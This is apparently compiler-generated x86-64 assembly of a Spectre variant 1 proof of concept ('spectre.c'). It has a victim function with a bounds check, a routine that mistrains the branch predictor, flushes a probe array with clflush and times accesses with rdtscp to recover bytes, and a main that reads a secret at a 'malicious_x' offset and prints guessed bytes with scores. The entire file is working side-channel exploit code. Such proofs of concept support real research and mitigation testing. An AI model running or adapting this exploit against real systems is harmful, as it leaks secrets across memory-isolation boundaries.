	.file	"spectre.c"
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.p2align 4
	.globl	leakByteLocalFunction
	.type	leakByteLocalFunction, @function
leakByteLocalFunction:
.LFB5690:
	.cfi_startproc

	movl	%edi, %edi
	leaq	array2(%rip), %rax
	movzbl	(%rax,%rdi), %eax
	andb	%al, temp(%rip)
	ret
	.cfi_endproc
.LFE5690:
	.size	leakByteLocalFunction, .-leakByteLocalFunction
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5691:
	.cfi_startproc

	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	jbe	.L4
	leaq	array1(%rip), %rax
	leaq	array2(%rip), %rdx
	movzbl	(%rax,%rdi), %eax
	sall	$9, %eax
	movzbl	(%rdx,%rax), %eax
	andb	%al, temp(%rip)
.L4:
	ret
	.cfi_endproc
.LFE5691:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5692:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	leaq	results.0(%rip), %r10
	movl	$128, %ecx
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	movl	$2863311531, %r14d
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	leaq	array1(%rip), %r13
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	leaq	array2(%rip), %r12
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	leaq	131072(%r12), %rbp
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	movl	$999, %ebx
	subq	$56, %rsp
	.cfi_def_cfa_offset 112
	movq	%rdi, 8(%rsp)
	movq	%r10, %rdi
	leaq	32(%rsp), %r11
	movq	%rsi, 16(%rsp)
	movq	%rdx, 24(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 40(%rsp)
	xorl	%eax, %eax
	movl	$0, 32(%rsp)
	rep stosq
.L7:
	leaq	array2(%rip), %rax
	.p2align 4,,10
	.p2align 3
.L8:
	clflush	(%rax)
	addq	$512, %rax
	cmpq	%rbp, %rax
	jne	.L8
	movl	array1_size(%rip), %esi
	movl	%ebx, %eax
	movl	$29, %r9d
	cltd
	idivl	%esi
	movq	8(%rsp), %rsi
	movslq	%edx, %rcx
	xorq	%rcx, %rsi
	.p2align 4,,10
	.p2align 3
.L10:
	clflush	array1_size(%rip)
	movl	$0, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jg	.L12
	.p2align 4,,10
	.p2align 3
.L9:
	movl	36(%rsp), %eax
	addl	$1, %eax
	movl	%eax, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jle	.L9
.L12:
	movl	%r9d, %eax
	imulq	%r14, %rax
	shrq	$34, %rax
	leal	(%rax,%rax,2), %edx
	movl	%r9d, %eax
	addl	%edx, %edx
	subl	%edx, %eax
	subl	$1, %eax
	xorw	%ax, %ax
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%rsi, %rdi
	xorq	%rcx, %rdi
	call	victim_function
	subl	$1, %r9d
	jnb	.L10
	movl	$13, %esi
	.p2align 4,,10
	.p2align 3
.L11:
	movzbl	%sil, %r8d
	movl	%r8d, %r15d
	sall	$9, %r15d
	rdtscp
	movq	%rax, %rdi
	salq	$32, %rdx
	movslq	%r15d, %r15
	movl	%ecx, (%r11)
	orq	%rdx, %rdi
	movzbl	(%r12,%r15), %eax
	rdtscp
	salq	$32, %rdx
	movl	%ecx, (%r11)
	orq	%rdx, %rax
	subq	%rdi, %rax
	cmpq	$100, %rax
	ja	.L13
	movl	%ebx, %eax
	movl	array1_size(%rip), %ecx
	cltd
	idivl	%ecx
	movslq	%edx, %rdx
	movzbl	0(%r13,%rdx), %eax
	cmpl	%r8d, %eax
	je	.L13
	addl	$1, (%r10,%r8,4)
.L13:
	addl	$167, %esi
	cmpl	$42765, %esi
	jne	.L11
	movl	(%r10), %esi
	movl	$1, %edi
	xorl	%ecx, %ecx
	movl	%esi, %edx
	jmp	.L15
	.p2align 4,,10
	.p2align 3
.L37:
	cmpl	$-1, %r9d
	je	.L20
	movslq	%r9d, %rdx
	cmpl	(%r10,%rdx,4), %eax
	cmovge	%edi, %r9d
.L14:
	movslq	%ecx, %rax
	addq	$1, %rdi
	movl	(%r10,%rax,4), %edx
	cmpq	$256, %rdi
	je	.L36
.L15:
	movl	(%r10,%rdi,4), %eax
	cmpl	%edx, %eax
	jl	.L37
	movl	%ecx, %r9d
	movl	%edi, %ecx
	jmp	.L14
	.p2align 4,,10
	.p2align 3
.L20:
	movl	%edi, %r9d
	jmp	.L14
.L36:
	movslq	%r9d, %rdi
	movl	(%r10,%rdi,4), %r8d
	leal	4(%r8,%r8), %r15d
	cmpl	%edx, %r15d
	jl	.L16
	cmpl	$2, %edx
	jne	.L22
	testl	%r8d, %r8d
	je	.L16
.L22:
	subl	$1, %ebx
	jne	.L7
.L16:
	movq	16(%rsp), %rbx
	xorl	32(%rsp), %esi
	movl	%esi, results.0(%rip)
	movq	24(%rsp), %rsi
	movb	%cl, (%rbx)
	movl	(%r10,%rax,4), %eax
	movl	%eax, (%rsi)
	movb	%r9b, 1(%rbx)
	movl	(%r10,%rdi,4), %eax
	movl	%eax, 4(%rsi)
	movq	40(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L38
	addq	$56, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L38:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC7:
	.string	"Reading at malicious_x = %p... "
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.8
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5693:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$72, %rsp
	.cfi_def_cfa_offset 128
	movl	%edi, 4(%rsp)
	movq	%rsi, 8(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 56(%rsp)
	xorl	%eax, %eax
.L40:
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	je	.L59
.L41:
	cmpb	$10, %al
	je	.L40
	cmpb	$105, %al
	jne	.L50
	xorl	%eax, %eax
	call	getpid@PLT
	movl	$1, %edi
	leaq	33+check(%rip), %rdx
	leaq	.LC12(%rip), %rsi
	movl	%eax, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	jne	.L41
.L59:
	movq	secret(%rip), %rdx
	leaq	.LC2(%rip), %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	leaq	array1(%rip), %rbx
	movq	%rdx, %rcx
	call	__printf_chk@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	subq	%rbx, %rax
	movq	%rax, 32(%rsp)
	call	strlen@PLT
	movl	$131072, %edx
	movl	$1, %esi
	leaq	array2(%rip), %rdi
	movl	%eax, 28(%rsp)
	movl	%eax, %r12d
	call	memset@PLT
	cmpl	$3, 4(%rsp)
	je	.L60
.L42:
	movl	%r12d, %edx
	xorl	%eax, %eax
	leaq	44(%rsp), %r14
	movl	$1, %edi
	leaq	.LC6(%rip), %rsi
	leaq	.LC7(%rip), %r15
	call	__printf_chk@PLT
	subl	$1, 28(%rsp)
	leaq	54(%rsp), %r13
	leaq	.LC8(%rip), %r12
	leaq	.LC9(%rip), %rbp
	js	.L40
	.p2align 4,,10
	.p2align 3
.L43:
	movq	32(%rsp), %rdx
	movq	%r15, %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movq	32(%rsp), %rdi
	movq	%r14, %rdx
	movq	%r13, %rsi
	leaq	1(%rdi), %rax
	movq	%rax, 32(%rsp)
	call	readMemoryByte
	movl	48(%rsp), %ebx
	movl	44(%rsp), %r8d
	movq	%r12, %rsi
	leaq	.LC1(%rip), %rdx
	movl	$1, %edi
	leal	(%rbx,%rbx), %eax
	movl	%r8d, (%rsp)
	cmpl	%eax, %r8d
	leaq	.LC0(%rip), %rax
	cmovge	%rax, %rdx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movzbl	54(%rsp), %edx
	movl	$63, %ecx
	movq	%rbp, %rsi
	movl	(%rsp), %r8d
	movl	$1, %edi
	movl	%edx, %eax
	subl	$32, %eax
	cmpb	$95, %al
	cmovb	%edx, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	testl	%ebx, %ebx
	jle	.L47
	movzbl	55(%rsp), %edx
	movl	$63, %ecx
	movl	%ebx, %r8d
	leaq	.LC10(%rip), %rsi
	movl	$1, %edi
	movl	%edx, %eax
	subl	$32, %eax
	cmpb	$95, %al
	cmovb	%edx, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
.L47:
	xorl	%eax, %eax
	leaq	.LC11(%rip), %rsi
	movl	$1, %edi
	call	__printf_chk@PLT
	subl	$1, 28(%rsp)
	jns	.L43
	jmp	.L40
.L50:
	movq	56(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L61
	addq	$72, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	xorl	%eax, %eax
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L60:
	.cfi_restore_state
	movq	8(%rsp), %r15
	leaq	32(%rsp), %rdx
	leaq	.LC3(%rip), %rsi
	xorl	%eax, %eax
	movq	8(%r15), %rdi
	call	__isoc99_sscanf@PLT
	movq	16(%r15), %rdi
	leaq	28(%rsp), %rdx
	xorl	%eax, %eax
	leaq	.LC4(%rip), %rsi
	subq	%rbx, 32(%rsp)
	call	__isoc99_sscanf@PLT
	movl	28(%rsp), %ecx
	movq	32(%rsp), %rdx
	xorl	%eax, %eax
	leaq	.LC5(%rip), %rsi
	movl	$1, %edi
	call	__printf_chk@PLT
	movl	28(%rsp), %r12d
	jmp	.L42
.L61:
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5693:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32

	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
